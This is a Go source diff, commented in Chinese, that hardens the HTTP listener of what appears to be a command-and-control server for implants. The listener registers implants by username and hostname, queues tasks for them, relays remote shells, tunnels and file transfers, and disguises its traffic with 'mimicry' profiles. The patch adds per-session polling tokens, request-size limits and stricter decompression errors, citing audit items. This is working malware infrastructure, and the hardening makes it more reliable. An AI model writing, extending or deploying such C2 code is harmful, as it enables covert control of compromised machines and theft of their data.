@@ -1,10 +1,14 @@
 package listener
 
 import (
+	"crypto/rand"
+	"crypto/subtle"
 	"crypto/tls"
 	"encoding/base64"
 	"encoding/binary"
+	"encoding/hex"
 	"encoding/json"
+	"errors"
 	"fmt"
 	"io"
 	"net"
@@ -50,6 +54,65 @@ type HTTPListener struct {
 	// 植入端下次心跳时批量取走。
 	downMu    sync.Mutex
 	downQueue map[string][][]byte
+
+	// ─── 会话令牌（审计 M2）───────────────────────────────────────────────
+	// sessionID → 每次注册时生成的 32 字节随机 hex token。
+	//
+	// 为什么需要：HTTP 轮询的 /task 是 GET，靠 session_id 查询参数拉任务，
+	// 而 session_id 会出现在控制台/截图/日志里。没有令牌时任何知道 session_id
+	// 的人都能 GET /task 把任务"抢走"（GetNext 会把它置为 sent），植入端再也
+	// 拿不到。令牌由**注册响应**下发（响应本身经 AES-GCM 加密），只给真正
+	// 完成注册的植入端，等价于"每次上线一个会话凭据"。
+	//
+	// 生命周期：注册时生成并覆盖旧值；会话被删除后由 pruneSessionTokens 清理；
+	// 缺 token / token 不匹配一律 403 且绝不调用 GetNext（不能 fail-open）。
+	tokenMu       sync.RWMutex
+	sessionTokens map[string]string
+}
+
+// ─── 轮询请求体的体积上限（审计 M4）───────────────────────────────────────────
+const (
+	// maxPollSmallBodyBytes 注册/心跳这类小 JSON 请求体的上限。
+	// 64 KiB 足够容纳最长的注册帧（主机名/用户名/进程名/多个 IP/MAC + JSON），
+	// 同时把"未认证大 body 打爆内存"的成本压到可以忽略。
+	maxPollSmallBodyBytes int64 = 64 << 10 // 64 KiB
+	// maxPollChunkBodyBytes 结果/隧道/Shell/文件分片这类确实要传大块的请求体上限。
+	// 取 16 MiB：与 TCP/WS 通道既有的 maxFrameSize（16 MiB）对齐，并且高于
+	// protocol.MaxPayloadSize（10 MiB）+ AEAD/JSON/Base64 包装的合理开销；
+	// 再大就说明不是合法帧。压缩炸弹由 decompressData 的 32 MiB 上限兜底。
+	maxPollChunkBodyBytes int64 = 16 << 20 // 16 MiB
+)
+
+// readPollBody 读取请求体并施加体积上限（审计 M4）。
+// 超限返回 413（不是 200、也不是 500），调用方必须立即返回、不再继续解析。
+func readPollBody(w http.ResponseWriter, r *http.Request, limit int64) ([]byte, bool) {
+	r.Body = http.MaxBytesReader(w, r.Body, limit)
+	body, err := io.ReadAll(r.Body)
+	if err != nil {
+		var tooLarge *http.MaxBytesError
+		if errors.As(err, &tooLarge) {
+			http.Error(w, fmt.Sprintf("request body too large (limit %d bytes)", limit), http.StatusRequestEntityTooLarge)
+			return nil, false
+		}
+		http.Error(w, "Bad request", http.StatusBadRequest)
+		return nil, false
+	}
+	return body, true
+}
+
+// decompressPollBody 解压轮询帧，并把解压失败转成明确的状态码（审计 M7）。
+// 超限回 413，其余解压/解析错误回 400 —— 绝不静默使用截断数据。
+func decompressPollBody(w http.ResponseWriter, decrypted []byte) ([]byte, bool) {
+	decompressed, err := decompressData(decrypted)
+	if err != nil {
+		if errors.Is(err, errDecompressedTooLarge) {
+			http.Error(w, "decompressed frame too large", http.StatusRequestEntityTooLarge)
+			return nil, false
+		}
+		http.Error(w, "Invalid packet", http.StatusBadRequest)
+		return nil, false
+	}
+	return decompressed, true
 }
 
 type shellSession struct {
@@ -79,7 +142,65 @@ func NewHTTPListener(cfg *config.ListenerConfig, sessMgr *session.Manager, taskM
 		shellControl:     make(map[string]*shellSession),
 		mimicry:          mimicry.ByName(cfg.MimicryProfile),
 		downQueue:        make(map[string][][]byte),
+		sessionTokens:    make(map[string]string),
 	}, nil
+}
+
+// issueSessionToken 为会话生成新的 32 字节随机令牌（hex，64 字符），覆盖旧值。
+//
+// 调用点只有 handleRegisterHTTP：注册帧是 AES-GCM 加密的，能解出来就说明
+// 持有协议密钥（等同已有认证），这是唯一可以"发放凭据"的路径。
+func (l *HTTPListener) issueSessionToken(sessionID string) (string, error) {
+	raw := make([]byte, 32)
+	if _, err := rand.Read(raw); err != nil {
+		return "", fmt.Errorf("generate session token: %w", err)
+	}
+	token := hex.EncodeToString(raw)
+	l.tokenMu.Lock()
+	if l.sessionTokens == nil {
+		l.sessionTokens = make(map[string]string)
+	}
+	l.sessionTokens[sessionID] = token
+	l.tokenMu.Unlock()
+	return token, nil
+}
+
+// sessionToken 返回会话当前的服务端令牌（不存在时 ok=false）。
+func (l *HTTPListener) sessionToken(sessionID string) (string, bool) {
+	l.tokenMu.RLock()
+	defer l.tokenMu.RUnlock()
+	token, ok := l.sessionTokens[sessionID]
+	return token, ok && token != ""
+}
+
+// verifySessionToken 校验请求携带的令牌是否与会话的服务端令牌一致。
+//
+// 缺失 token、会话没有令牌（老载荷/未注册）、长度不符、内容不符 —— 全部 false，
+// 调用方必须 403 且不得继续调用 GetNext。常量时间比较避免逐字节计时侧信道。
+func (l *HTTPListener) verifySessionToken(sessionID, token string) bool {
+	if sessionID == "" || token == "" {
+		return false
+	}
+	want, ok := l.sessionToken(sessionID)
+	if !ok {
+		return false
+	}
+	return subtle.ConstantTimeCompare([]byte(want), []byte(token)) == 1
+}
+
+// pruneSessionTokens 清理已不存在会话的令牌（会话被删除/过期后回收内存）。
+// 由 heartbeatChecker 的 5s 周期顺带执行，避免为它单开一个 goroutine。
+func (l *HTTPListener) pruneSessionTokens() {
+	if l.sessionMgr == nil {
+		return
+	}
+	l.tokenMu.Lock()
+	defer l.tokenMu.Unlock()
+	for sid := range l.sessionTokens {
+		if _, err := l.sessionMgr.Get(sid); err != nil {
+			delete(l.sessionTokens, sid)
+		}
+	}
 }
 
 // queueDown 把一帧加密后加入会话的下行队列（HTTP 轮询模式的服务端→植入端通道）。
@@ -239,6 +360,8 @@ func (l *HTTPListener) heartbeatChecker() {
 }
 
 func (l *HTTPListener) checkHeartbeats() {
+	// 顺带回收已删除会话的令牌（不应答、不影响判活逻辑）。
+	l.pruneSessionTokens()
 	sessions := l.sessionMgr.List()
 	now := time.Now()
 	for _, sess := range sessions {
@@ -323,9 +446,8 @@ func (l *HTTPListener) handleRegisterHTTP(w http.ResponseWriter, r *http.Request
 		l.getMimicry().Shape(w)
 	}
 
-	body, err := io.ReadAll(r.Body)
-	if err != nil {
-		http.Error(w, "Bad request", http.StatusBadRequest)
+	body, ok := readPollBody(w, r, maxPollSmallBodyBytes)
+	if !ok {
 		return
 	}
 
@@ -335,7 +457,10 @@ func (l *HTTPListener) handleRegisterHTTP(w http.ResponseWriter, r *http.Request
 		return
 	}
 
-	decompressed, _ := decompressData(decrypted)
+	decompressed, ok := decompressPollBody(w, decrypted)
+	if !ok {
+		return
+	}
 
 	packet, err := parsePacket(decompressed)
 	if err != nil || packet == nil {
@@ -369,13 +494,26 @@ func (l *HTTPListener) handleRegisterHTTP(w http.ResponseWriter, r *http.Request
 
 	fmt.Printf("[INFO] [http-listener] Implant registered: %s (%s@%s)\n", sessionID, reg.Username, reg.Hostname)
 
+	// 审计 M2：每次注册发放（覆盖）该会话的 HTTP 轮询令牌。令牌只出现在
+	// 这个加密响应里 —— 之后 /task 拉取必须带上它，否则 403。
+	token, err := l.issueSessionToken(sessionID)
+	if err != nil {
+		http.Error(w, "Internal error", http.StatusInternalServerError)
+		return
+	}
+	ackPayload, _ := json.Marshal(map[string]string{
+		"status":        "registered",
+		"session_id":    sessionID,
+		"session_token": token,
+	})
+
 	ack := &protocol.Packet{
 		Magic:     [4]byte{'T', 'S', 'H', 'L'},
 		Version:   protocol.Version,
 		Type:      protocol.TypeAck,
 		ID:        packet.ID,
 		Timestamp: uint64(time.Now().UnixMilli()),
-		Payload:   []byte(fmt.Sprintf(`{"status":"registered","session_id":"%s"}`, sessionID)),
+		Payload:   ackPayload,
 	}
 
 	resp := encodePacket(ack)
@@ -395,9 +533,8 @@ func (l *HTTPListener) handleHeartbeatHTTP(w http.ResponseWriter, r *http.Reques
 		l.getMimicry().Shape(w)
 	}
 
-	body, err := io.ReadAll(r.Body)
-	if err != nil {
-		http.Error(w, "Bad request", http.StatusBadRequest)
+	body, ok := readPollBody(w, r, maxPollSmallBodyBytes)
+	if !ok {
 		return
 	}
 
@@ -407,7 +544,10 @@ func (l *HTTPListener) handleHeartbeatHTTP(w http.ResponseWriter, r *http.Reques
 		return
 	}
 
-	decompressed, _ := decompressData(decrypted)
+	decompressed, ok := decompressPollBody(w, decrypted)
+	if !ok {
+		return
+	}
 	packet, err := parsePacket(decompressed)
 	if err != nil || packet == nil {
 		http.Error(w, "Invalid packet", http.StatusBadRequest)
@@ -522,6 +662,14 @@ func (l *HTTPListener) handleTaskHTTP(w http.ResponseWriter, r *http.Request) {
 			return
 		}
 
+		// 审计 M2：校验注册时下发的会话令牌。缺失/不匹配一律 403，且**必须**
+		// 在校验通过后才调用 GetNext —— GetNext 会把任务置为 sent 并取走，
+		// "先取任务再校验"等于没修（任务已经被抢走了）。
+		if !l.verifySessionToken(sessionID, r.URL.Query().Get("token")) {
+			http.Error(w, "Forbidden", http.StatusForbidden)
+			return
+		}
+
 		task, err := l.taskMgr.GetNext(sessionID)
 		if err != nil || task == nil {
 			resp := &protocol.Packet{
@@ -578,9 +726,11 @@ func (l *HTTPListener) handleResultHTTP(w http.ResponseWriter, r *http.Request) 
 		l.getMimicry().Shape(w)
 	}
 
-	body, err := io.ReadAll(r.Body)
-	if err != nil {
-		http.Error(w, "Bad request", http.StatusBadRequest)
+	// 结果帧可能携带大段命令输出（protocol.MaxPayloadSize=10 MiB），
+	// 因此用 16 MiB 而不是 64 KiB —— 上限必须高于合法业务量，否则正常
+	// 大输出会被 413 打断。
+	body, ok := readPollBody(w, r, maxPollChunkBodyBytes)
+	if !ok {
 		return
 	}
 
@@ -590,7 +740,10 @@ func (l *HTTPListener) handleResultHTTP(w http.ResponseWriter, r *http.Request) 
 		return
 	}
 
-	decompressed, _ := decompressData(decrypted)
+	decompressed, ok := decompressPollBody(w, decrypted)
+	if !ok {
+		return
+	}
 	packet, err := parsePacket(decompressed)
 	if err != nil || packet == nil {
 		http.Error(w, "Invalid packet", http.StatusBadRequest)
@@ -649,9 +802,8 @@ func (l *HTTPListener) handleTunnelHTTP(w http.ResponseWriter, r *http.Request) 
 		l.getMimicry().Shape(w)
 	}
 
-	body, err := io.ReadAll(r.Body)
-	if err != nil {
-		http.Error(w, "Bad request", http.StatusBadRequest)
+	body, ok := readPollBody(w, r, maxPollChunkBodyBytes)
+	if !ok {
 		return
 	}
 
@@ -661,7 +813,10 @@ func (l *HTTPListener) handleTunnelHTTP(w http.ResponseWriter, r *http.Request) 
 		return
 	}
 
-	decompressed, _ := decompressData(decrypted)
+	decompressed, ok := decompressPollBody(w, decrypted)
+	if !ok {
+		return
+	}
 	packet, err := parsePacket(decompressed)
 	if err != nil || packet == nil {
 		http.Error(w, "Invalid packet", http.StatusBadRequest)
@@ -702,9 +857,8 @@ func (l *HTTPListener) handleShellHTTP(w http.ResponseWriter, r *http.Request) {
 		l.getMimicry().Shape(w)
 	}
 
-	body, err := io.ReadAll(r.Body)
-	if err != nil {
-		http.Error(w, "Bad request", http.StatusBadRequest)
+	body, ok := readPollBody(w, r, maxPollChunkBodyBytes)
+	if !ok {
 		return
 	}
 
@@ -714,7 +868,10 @@ func (l *HTTPListener) handleShellHTTP(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	decompressed, _ := decompressData(decrypted)
+	decompressed, ok := decompressPollBody(w, decrypted)
+	if !ok {
+		return
+	}
 	packet, err := parsePacket(decompressed)
 	if err != nil || packet == nil {
 		http.Error(w, "Invalid packet", http.StatusBadRequest)
@@ -838,9 +995,8 @@ func (l *HTTPListener) handleFileHTTP(w http.ResponseWriter, r *http.Request) {
 		l.getMimicry().Shape(w)
 	}
 
-	body, err := io.ReadAll(r.Body)
-	if err != nil {
-		http.Error(w, "Bad request", http.StatusBadRequest)
+	body, ok := readPollBody(w, r, maxPollChunkBodyBytes)
+	if !ok {
 		return
 	}
 	decrypted, err := l.encryptor.Decrypt(body)
@@ -848,7 +1004,10 @@ func (l *HTTPListener) handleFileHTTP(w http.ResponseWriter, r *http.Request) {
 		http.Error(w, "Unauthorized", http.StatusUnauthorized)
 		return
 	}
-	decompressed, _ := decompressData(decrypted)
+	decompressed, ok := decompressPollBody(w, decrypted)
+	if !ok {
+		return
+	}
 	packet, err := parsePacket(decompressed)
 	if err != nil || packet == nil {
 		http.Error(w, "Invalid packet", http.StatusBadRequest)
@@ -903,9 +1062,8 @@ func (l *HTTPListener) handleFilePullHTTP(w http.ResponseWriter, r *http.Request
 		l.getMimicry().Shape(w)
 	}
 
-	body, err := io.ReadAll(r.Body)
-	if err != nil {
-		http.Error(w, "Bad request", http.StatusBadRequest)
+	body, ok := readPollBody(w, r, maxPollChunkBodyBytes)
+	if !ok {
 		return
 	}
 	decrypted, err := l.encryptor.Decrypt(body)
@@ -913,7 +1071,10 @@ func (l *HTTPListener) handleFilePullHTTP(w http.ResponseWriter, r *http.Request
 		http.Error(w, "Unauthorized", http.StatusUnauthorized)
 		return
 	}
-	decompressed, _ := decompressData(decrypted)
+	decompressed, ok := decompressPollBody(w, decrypted)
+	if !ok {
+		return
+	}
 	packet, err := parsePacket(decompressed)
 	if err != nil || packet == nil {
 		http.Error(w, "Invalid packet", http.StatusBadRequest)
